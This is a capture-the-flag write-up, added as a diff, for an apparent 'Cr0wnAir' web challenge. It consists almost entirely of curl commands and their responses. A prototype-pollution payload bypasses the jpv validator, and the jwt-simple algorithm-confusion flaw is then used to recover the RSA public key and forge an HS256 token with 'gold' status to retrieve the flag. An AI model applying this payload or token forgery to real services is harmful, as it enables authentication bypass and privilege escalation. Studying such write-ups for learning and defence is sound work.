@@ -1,0 +1,57 @@
+Step 1:
+	Bypass jpv
+
+Source:
+	https://github.com/advisories/GHSA-rh46-3fgc-mvrf
+	https://github.com/manvel-khnkoyan/jpv/issues/6
+
+
+```
+curl -X POST -H "Content-Type: application/json" --data '{"firstName":"castilho","lastName":"castilho","passport":"123456789","ffp":"CA12345678", "extras":{ "sssr": {"sssr":"FQTU"}, "constructor":{"name":"Array"}}}' http://34.105.202.19:3000/checkin
+```
+```
+{"msg":"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg"}
+```
+
+Step 2:
+	Use jwt-simple cve by figuring out public key
+
+Source:
+	https://snyk.io/vuln/SNYK-JS-JWTSIMPLE-174523
+	https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/
+Tool:
+	https://github.com/silentsignal/rsa_sign2n
+
+
+1. Get paris
+curl -X POST -H "Content-Type: application/json" --data '{"firstName":"castilho","lastName":"castilho","passport":"123456789","ffp":"CA12345678", "extras":{ "sssr": {"sssr":"FQTU"}, "constructor":{"name":"Array"}}}' http://34.105.202.19:3000/checkin
+```
+{"msg":"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg"}
+```
+
+curl -X POST -H "Content-Type: application/json" --data '{"firstName":"castilho","lastName":"castilho","passport":"123456789","ffp":"CA12345679", "extras":{ "sssr": {"sssr":"FQTU"}, "constructor":{"name":"Array"}}}' http://34.105.202.19:3000/checkin
+```
+{"msg":"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc5In0.mBfKC1kpXgQGyoz43BV-K7Za0Qliy_yeu4lUkyqsv1ba19U2rkL_cToPHNQh53cFTzAVHvT-g1ZXtGiOb7vTksRCG6AC555d1C8bS5Owm0pggL6XmVKlM5bSieoo6WjLdcgHceYO_oJeMexv35fKSveOBumjsDYglWf0xz-BWXQ27lWWSYU4tuXvUG0h4I313YW62B6oG7HP9YB5JiC3idBeKwUuYImUqJeO-HvcT3UU5H6zIQu4xhlDQxjtU0VtsWgoi-DTPG90We2RmjoyK2crpGz6O5xC7sbZc0bQp1MJy6fLZSDTd-HvZJi81wGQnfckTapf0-FP9puU13gRPw"}
+```
+
+docker run -it sig2n /bin/bash
+Modify the script jwt_forgery.py (line 42)
+```
+payload_encoded=b64urlencode(json.dumps({"status":"gold","ffp":"CA12345678"}).encode('utf8'))
+```
+
+# Create new jwt token
+python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc5In0.mBfKC1kpXgQGyoz43BV-K7Za0Qliy_yeu4lUkyqsv1ba19U2rkL_cToPHNQh53cFTzAVHvT-g1ZXtGiOb7vTksRCG6AC555d1C8bS5Owm0pggL6XmVKlM5bSieoo6WjLdcgHceYO_oJeMexv35fKSveOBumjsDYglWf0xz-BWXQ27lWWSYU4tuXvUG0h4I313YW62B6oG7HP9YB5JiC3idBeKwUuYImUqJeO-HvcT3UU5H6zIQu4xhlDQxjtU0VtsWgoi-DTPG90We2RmjoyK2crpGz6O5xC7sbZc0bQp1MJy6fLZSDTd-HvZJi81wGQnfckTapf0-FP9puU13gRPw
+
+
+[+] Found n with multiplier 5  :
+ 0xc3995f664ac0cc18e5dae7f66c5e2ab96ccf6e613372c8d51b011e3eb8f7b5087681058cc3b1cebcd36a54c59bbb22b45585b293f109d885e4ad5f91ef2cf544e15fda0307e8c45c7556a4405d0c40955118e9b0008c62f98ed7ddfa3c1ec8c9573cc49385f2fa7593192fc5b8d496fa7d1c87cd67959ca4bab55c0ca4d2ef3c4f8ceb643acc1fca9a2a672109f14ca7df656059c67520ae020759bd65ad230cb537d288724f77b7194593faa9144a2687b4c4d58aaf02c5233395f142d404a6013d70184fbfadc52d4cfbd52a68747d33b6b2a12c090a76306cca93c2b5221c1dbee697aa03851887016daa8cc0a8e95c87d325221beebc04cbf8b737dcbc0b
+[+] Written to c3995f664ac0cc18_65537_x509.pem
+[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.yncoTDoKFPcSA90PBqPayLUnDhoBEIQay4A6p0tD8z8'
+[+] Written to c3995f664ac0cc18_65537_pkcs1.pem
+[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.cLVShR2bijq_NZGU4xT5wv938aaGsKW9At2TYb2-lk8'
+
+
+curl -X POST -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.yncoTDoKFPcSA90PBqPayLUnDhoBEIQay4A6p0tD8z8" http://34.105.202.19:3000/upgrades/flag
+	{"msg":"union{I_<3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}"}
+
